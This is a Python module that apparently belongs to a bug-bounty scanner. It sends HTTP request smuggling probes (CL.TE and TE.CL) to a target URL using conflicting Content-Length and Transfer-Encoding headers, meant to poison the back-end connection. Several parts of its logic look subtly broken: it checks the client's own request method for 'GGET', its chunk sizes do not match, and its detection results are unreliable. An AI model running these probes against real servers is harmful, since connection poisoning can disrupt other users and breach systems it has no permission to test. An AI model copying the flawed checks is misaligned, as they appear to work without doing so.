import httpx
import asyncio
from typing import List, Dict, Optional

class SmugglingEngine:
    """
    Aura v33 Zenith: HTTP Request Smuggling Detection Engine.
    Detects CL.TE, TE.CL, and TE.TE vulnerabilities for high-multiplier bounties.
    """
    
    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout

    async def check_cl_te(self, url: str) -> bool:
        """
        Detects CL.TE Smuggling (Content-Length on Front, Transfer-Encoding on Back).
        Sends a request where Content-Length covers the smuggled request, 
        but Transfer-Encoding terminates early.
        """
        payload = (
            "0\r\n"
            "\r\n"
            "G"
        )
        headers = {
            "Content-Length": str(len(payload) + 5), # Cover the smuggled part
            "Transfer-Encoding": "chunked",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        try:
            async with httpx.AsyncClient() as client:
                # 1. Smuggle the prefix
                await client.post(url, content=payload, headers=headers, timeout=self.timeout)
                # 2. Poison the connection
                resp = await client.get(url, timeout=self.timeout)
                if resp.status_code == 404 or "GGET" in resp.request.method:
                    return True
        except:
            pass
        return False

    async def check_te_cl(self, url: str) -> bool:
        """
        Detects TE.CL Smuggling (Transfer-Encoding on Front, Content-Length on Back).
        """
        payload = (
            "b\r\n"
            "GPOST / HTTP/1.1\r\n"
            "0\r\n"
            "\r\n"
        )
        headers = {
            "Content-Length": "4", # Back-end only reads 'b\r\n'
            "Transfer-Encoding": "chunked",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        try:
            async with httpx.AsyncClient() as client:
                await client.post(url, content=payload, headers=headers, timeout=self.timeout)
                resp = await client.get(url, timeout=self.timeout)
                if resp.status_code == 404:
                    return True
        except:
            pass
        return False

    async def run(self, url: str) -> List[Dict]:
        """Runs the full smuggling detection suite."""
        findings = []
        if await self.check_cl_te(url):
            findings.append({
                "type": "HTTP_SMUGGLING",
                "severity": "CRITICAL",
                "description": "Detected CL.TE HTTP Request Smuggling.",
                "target": url
            })
        if await self.check_te_cl(url):
            findings.append({
                "type": "HTTP_SMUGGLING",
                "severity": "CRITICAL",
                "description": "Detected TE.CL HTTP Request Smuggling.",
                "target": url
            })
        return findings
